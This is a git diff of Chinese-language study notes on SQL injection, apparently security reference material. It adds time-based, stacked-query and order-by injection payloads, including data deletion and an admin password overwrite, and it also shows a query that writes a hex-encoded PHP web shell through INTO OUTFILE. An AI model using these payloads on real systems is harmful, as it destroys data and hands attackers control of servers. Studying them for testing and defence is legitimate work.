@@ -9,16 +9,15 @@ SQL注入漏洞(SQL injection) - 对用户请求中的输入的参数值过滤�
 * error-based 基于报错的SQL注入
 * UNION query-based 基于联合查询的SQL注入
 * stacked queries 堆叠查询
-  * 执行一次查询时，通过分号分隔sql语句，执行两条或更多的SQL语句
 * out-of-band 带外
 
 #### 例1 - "基于时间的盲注"
 
-**基于时间的盲注(Time-Based Blind SQL Injection Attacks)**：利用能够"延时"的函数构造SQL语句 然后根据响应时长(响应时间间隔的数值大小)进行判断
+基于时间的盲注(Time-Based Blind SQL Injection Attacks)原理：利用能够"延时"的函数构造SQL语句 然后根据响应时长(响应时间间隔的数值大小)进行判断
 
 * 无害验证payload - 验证该漏洞是否存在
   * 如对某个使用MySQL数据库的WEB系统测试时发送的请求含payload `(select*from(select(sleep(20)))a)` 得到response的时间为20秒
-* 攻击利用payload - 利用该漏洞进行数据获取
+* 攻击利用payload - 利用该漏洞进行"数据获取"
   * 基于时间的盲注漏洞 只需利用 条件语法(Condition syntax) 与延时函数 就能判断出执行结果True/False 根据结果判断逐个字符 从而得到数据库中的具体数据
     * 参考[Time-Based Blind SQL Injection Attacks](http://www.sqlinjection.net/time-based/) 和 [Timing-based Blind SQL Attacks](https://hackernoon.com/timing-based-blind-sql-attacks-bd276dc618dd)
       * MySQL`SLEEP(time)` `BENCHMARK(count, expr)`
@@ -26,6 +25,17 @@ SQL注入漏洞(SQL injection) - 对用户请求中的输入的参数值过滤�
       * Oracle
       * Postgres `pg_sleep(5)` 如`SELECT CASE WHEN secret = 'secret' THEN pg_sleep(5) ELSE NULL END FROM apps WHERE id = 1 ;`
       * ...
+
+#### 例2 - 堆叠查询
+
+堆叠查询(stacked queries)原理:通过分号分隔 实现执行多条SQL语句
+
+* 无害验证payload - 验证该漏洞是否存在
+  * 删除数据 MySQL `SELECT * FROM products WHERE productid=1; select sleep(3)`
+* 攻击利用payload - 利用该漏洞"执行SQL语句" 操作数据
+  * 删除数据 MySQL `SELECT * FROM products WHERE productid=1; DELETE FROM products`
+  * 修改数据 MySQL `SELECT * FROM products WHERE categoryid=1; UPDATE members SET password='pwd' WHERE username='admin'`
+  * ...
 
 ### 漏洞危害
 
@@ -78,9 +88,90 @@ test.get_content() #获取第一列第一个字段内容
 * HTTP参数污染(HTTP Parameter Pollution)
 * ...
 
+#### 常见错误 - 写入文件失败
+
+MySQL >= 5.7(可能更早的版本) 没有进行任何配置情况下`secure_file_priv`的默认值为`NULL` 即禁止mysqld导入或导出. 所以即使是MySQL的root用户也无法读写文件. 报错为
+
+```
+ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
+```
+
+查看当前环境中`secure-file-priv`的值:
+```
+mysql> show global variables like '%secure_file_priv%';
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_file_priv | NULL  |
++------------------+-------+
+1 row in set (0.00 sec)
+```
+
+修改secure_file_priv的值:
+```
+# 要修改secure_file_priv的值，必须修改配置文件并重新启动`mysqld`服务
+# windows下的配置文件为`my.ini`
+# linux下的配置文件为`my.cnf`
+
+[mysqld]
+secure-file-priv = ""
+
+# 情况1 没有进行任何配置情况下，`secure_file_priv`不存在，此时使用它的默认值`NULL` 即禁止mysqld导入或导出. 
+# 情况2 secure_file_priv="/tmp/" 表示mysqld只能在/tmp/目录下 导入或导出.
+# 情况3 secure-file-priv = ""    表示mysqld可以在任意目录进行导入或导出.
+```
+
 ### 重点检测
 
 #### 无法使用"预编译语句"的情况 - `order by`
+
+# 为什么order by无法使用"预编译语句"?
+```
+# order by 的正常使用 如
+select aid,adenname from sea_myad order by adenname;
+
+# order by 之后 如果使用"预编译语句"  字段名会被加上引号 使order by子句"失效" 即不会对结果进行排序
+select aid,adenname from sea_myad order by "adenname";
+```
+
+order by注入检测 - 基于布尔的注入
+
+```
+#条件语句，条件如果是执行第二个参数，否执行第三个参数
+if(condition,true,false)
+
+# 利用regexp
+mysql> select aid,adenname from sea_myad order by (select 1 regexp if(1=1,1,0x00));
++-----+-------------------+
+| aid | adenname          |
++-----+-------------------+
+|   1 | channel200x200bt  |
+|   2 | channel200x200top |
++-----+-------------------+
+
+
+mysql> select aid,adenname from sea_myad order by (select 1 regexp if(1=2,1,0x00));
+ERROR 1139 (42000): Got error 'empty (sub)expression' from regexp
+```
+
+order by注入检测 - 基于报错的注入
+```
+# 报错方式1
+mysql> select aid,adenname from sea_myad order by updatexml(1,if(1=1,user(),2),1);
+ERROR 1105 (HY000): XPATH syntax error: '@localhost'
+
+# 报错方式2
+mysql> select aid,adenname from sea_myad order by extractvalue(1,if(1=1,user(),2));
+ERROR 1105 (HY000): XPATH syntax error: '@localhost'
+```
+
+order by注入检测 - 基于时间的注入
+```
+# 有几条记录 就延时几秒
+# 记录很多的情况下 不能使用这种方式
+mysql> select aid,adenname from sea_myad order by if(1=1,sleep(1),2);
+```
+
 
 #### 无法使用"预编译语句"的情况 - `limit`
 
@@ -113,7 +204,6 @@ concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
 
 SELECT 1 from mysql.user order by 1 limit 0,1 into outfile '/tmp/s.php' LINES TERMINATED BY 0x3c3f7068702061737365727428245f504f53545b6173617361735d293b3f3e;
 ```
-
 
 #### 宽字节注入
 
